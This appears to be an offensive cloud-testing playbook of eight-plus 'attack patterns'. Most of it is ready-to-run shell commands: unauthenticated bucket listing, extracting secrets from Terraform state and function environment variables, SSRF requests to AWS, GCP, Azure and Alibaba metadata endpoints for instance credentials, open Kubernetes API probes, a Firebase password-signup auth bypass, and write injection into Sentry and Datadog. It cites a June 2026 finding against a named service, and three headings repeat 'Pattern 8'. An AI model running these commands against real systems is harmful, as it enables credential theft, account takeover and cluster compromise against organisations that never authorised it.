# Proven Cloud Attack Patterns

Quick-check patterns with high hit rates. Run these first before systematic phase testing.

## Pattern 1: Public S3/GCS via CNAME

**Hit rate:** High — many companies expose storage via subdomains
**Check:**
```bash
# Find storage CNAMEs
dig +short CNAME assets.target.com  # → bucket.s3.amazonaws.com
dig +short CNAME cdn.target.com     # → storage.googleapis.com

# Test listing via CNAME (may work even when direct access denied)
curl -s "https://assets.target.com/" | head -50
# Compare with direct
aws s3 ls s3://bucket-name --no-sign-request
```
**Impact:** Low (listing only) → Critical (if contains terraform.tfstate, .env, backups)

## Pattern 2: Terraform State in Storage

**Hit rate:** Medium-high — common in IaC-heavy orgs
**Check:**
```bash
# Common paths in discovered buckets
for key in terraform.tfstate terraform/state .terraform/terraform.tfstate infra/terraform.tfstate; do
  aws s3 cp "s3://<bucket>/$key" /tmp/tfstate --no-sign-request 2>/dev/null && echo "FOUND: $key"
done
# Extract secrets from state
cat /tmp/tfstate | jq -r '.. | .access_key? // .secret_key? // .password? // empty' 2>/dev/null | sort -u
```
**Impact:** Critical — state files contain plaintext credentials, DB passwords, API keys

## Pattern 3: Lambda/Function Environment Variables

**Hit rate:** High — developers store secrets in env vars
**Check:**
```bash
# AWS — list all functions, extract env vars
aws lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | while read fn; do
  aws lambda get-function-configuration --function-name "$fn" --query 'Environment.Variables' 2>/dev/null
done

# GCP
gcloud functions list --format='value(name)' | while read fn; do
  gcloud functions describe "$fn" --format='value(environmentVariables)'
done
```
**Impact:** High-Critical — DB credentials, API keys, signing secrets

## Pattern 4: IMDSv1 Metadata via SSRF

**Hit rate:** Medium — requires SSRF, but IMDSv1 still common
**Check:**
```bash
# If you have SSRF (from ptest/atest):
# AWS IMDSv1 (no token needed)
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Then fetch the role credentials
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"

# GCP (requires header but SSRF often passes it)
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
**Impact:** Critical — instance role credentials → cloud account access

## Pattern 5: GitHub Leaked AWS Keys

**Hit rate:** Medium — automated scanners catch most, but old commits persist
**Check:**
```bash
# Search GitHub for org's leaked keys
# Patterns: AKIA (AWS access key), ASIA (temporary), private_key
# Use trufflehog or github search:
# https://github.com/search?q=org%3A<org>+AKIA&type=code
# https://github.com/search?q=<company>+aws_secret_access_key&type=code

# Verify found key is still active
aws sts get-caller-identity  # with the found credentials
```
**Impact:** High-Critical — depends on key's IAM permissions

## Pattern 6: Actuator/Debug on Cloud-Hosted Apps

**Hit rate:** Medium-high — Spring Boot apps on ECS/EKS often expose actuator
**Check:**
```bash
for path in /actuator/env /actuator/configprops /actuator/heapdump /env /debug/vars; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://<target>$path")
  [ "$code" = "200" ] && echo "EXPOSED: $path"
done
```
**Impact:** High — /actuator/env leaks cloud credentials, DB strings, API keys

## Pattern 7: Public EKS/GKE API Server

**Hit rate:** Low-medium — but Critical when found
**Check:**
```bash
# Common K8s API ports
for port in 6443 443 8443; do
  curl -sk "https://<target>:$port/version" 2>/dev/null | grep -q "major" && echo "K8S API: port $port"
done
# Unauthenticated access check
curl -sk "https://<target>:6443/api/v1/namespaces" | head -20
curl -sk "https://<target>:6443/api/v1/pods" | head -20
```
**Impact:** Critical — unauthenticated K8s API = full cluster compromise

## Pattern 8: Firebase Auth Provider Bypass

**Hit rate:** Medium-high — apps using email-link/phone auth often leave password auth enabled
**Check:**
```bash
# Extract API key from page source / JS bundles (look for firebaseConfig)
# Then test password signup (MUST include Referer header):
curl -sk -H "Referer: https://TARGET/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY" \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"test@attacker.com","password":"Test123!","returnSecureToken":true}'
# VULN if: returns {"idToken":"eyJ..."} — password signup works when app only uses emailLink

# Decode JWT to confirm:
echo "$TOKEN" | cut -d. -f2 | base64 -d | python3 -m json.tool
# Check: firebase.sign_in_provider should be "password" (bypasses intended "emailLink" flow)
```
**Impact:** Medium-High — auth flow bypass, account squatting, KYC bypass on regulated platforms (gambling, finance). On WinTicket (June 2026): password signUp returned valid JWT while app exclusively uses email-link auth. Combined with `/v1/auth/email` accepting the token (HTTP 204) = full registration bypass.

---

## Pattern 8: Alibaba Cloud (Aliyun) Infrastructure

**Hit rate:** Medium — common for Ant Group, Alipay, and SEA fintech targets
**Fingerprints:**
```bash
# Headers that confirm Alibaba Cloud
curl -sI https://target.com | grep -iE '(x-oss|x-fc|server: Tengine|server: Spanner|server: ESA|via: ispanner|via: ens-cache)'
# DNS
dig +short CNAME target.com  # *.w.cdngslb.com (CDN), *.alipaydns.com (Ant DNS)
```

**Metadata endpoint (different from AWS!):**
```bash
# Alibaba Cloud uses 100.100.100.200, NOT 169.254.169.254
curl http://100.100.100.200/latest/meta-data/
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

**OSS bucket enumeration:**
```bash
# Regions: oss-ap-southeast-1, oss-cn-hangzhou, oss-cn-shanghai
for region in oss-ap-southeast-1 oss-cn-hangzhou oss-cn-shanghai; do
  curl -s "https://${BUCKET}.${region}.aliyuncs.com/" | head -5
done
# Also test via CNAME (may have different ACL)
# OSS POST → XML MethodNotAllowed + webapp-origin.marmot-cloud.com = dead end (static CDN)
```

**Function Compute:**
```bash
# x-fc-request-id header = Alibaba FC
# POST /invoke may return internal errors (HTTP 599)
curl -sk -X POST -H 'Content-Type: application/json' -d '{}' 'https://target.com/invoke'
# "PackInfoNotInitError" = broken/uninitialized function (not exploitable, info-level)
```

**Container Registry:**
```bash
# Alibaba Container Registry (ACR)
curl -sk "https://registry-intl.ap-southeast-1.aliyuncs.com/${NAMESPACE}/"
```

**Impact:** Varies — OSS listing (Low-Medium), metadata SSRF (Critical), FC code exec (Critical)

---

## Pattern 8: Third-Party Service Token Abuse (Sentry/Datadog/Braze)

**Hit rate:** High — client-side tokens for observability/push services often have write access
**Check:**
```bash
# Extract tokens from JS bundles / HTML config
grep -oE 'SENTRY_DSN.*?"|DD_CLIENT_TOKEN.*?"|BRAZE_API_KEY.*?"' source.js

# Sentry DSN write test
curl -sk -X POST "https://<org>.ingest.sentry.io/api/<project>/store/" \
  -H "Content-Type: application/json" \
  -H "X-Sentry-Auth: Sentry sentry_version=7, sentry_key=<key>" \
  -d '{"event_id":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","message":"test","level":"info","platform":"javascript"}'
# 200 + event_id = write access confirmed

# Datadog RUM injection
curl -sk -X POST "https://browser-intake-datadoghq.com/api/v2/rum?dd-api-key=<client_token>&dd-evp-origin=browser&dd-request-id=test" \
  -H "Content-Type: text/plain" \
  -d '{"application":{"id":"<app_id>"},"session":{"id":"test"},"view":{"id":"test"},"type":"error","error":{"message":"injected","source":"custom"}}'
# 202 = write access confirmed

# Datadog Logs injection
curl -sk -X POST "https://browser-intake-datadoghq.com/api/v2/logs?dd-api-key=<client_token>&dd-evp-origin=browser" \
  -H "Content-Type: text/plain" \
  -d '[{"message":"injected log","status":"error","service":"target-service"}]'
# 202 = write access confirmed
```
**Impact:** Low standalone (monitoring pollution, alert fatigue). Chain with social engineering for Medium (fake critical alerts → incident response manipulation). Report as monitoring infrastructure write access.

---

## When to Add New Patterns

Add after engagement when:
- Pattern produced a confirmed finding
- Applies to multiple cloud environments (not target-specific)
- Can be checked in <5 minutes
